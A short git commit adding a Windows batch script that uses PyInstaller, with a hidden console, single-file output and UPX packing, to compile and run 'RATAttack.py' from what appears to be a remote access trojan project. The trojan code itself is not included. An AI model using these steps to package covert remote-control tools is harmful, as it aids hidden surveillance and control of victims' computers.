b964c49c66e4a5ffb15bfa473be400af31104bf1
PulkitSingh256 <psinghania256@gmail.com>
2017-06-30 20:27:57 +0530

    Automatic Batch to Compile Executable

---
+++ compile.bat
@@ -0,0 +1,3 @@
+rem --specpath "C:\Users\PULKIT\Desktop\NR-RAT-BETA-v0.1--master" --distpath "C:\Users\PULKIT\Desktop\NR-RAT-BETA-v0.1--master\dist" --workpath "C:\Users\PULKIT\Desktop\NR-RAT-BETA-v0.1--master\build"
+pyinstaller --clean --upx-dir "upx393w" --noconsole --onefile "C:\Users\PULKIT\Desktop\NR-RAT-BETA-v0.1--master\RATAttack.py"
+"C:\Users\PULKIT\Desktop\NR-RAT-BETA-v0.1--master\dist\RATAttack.exe"
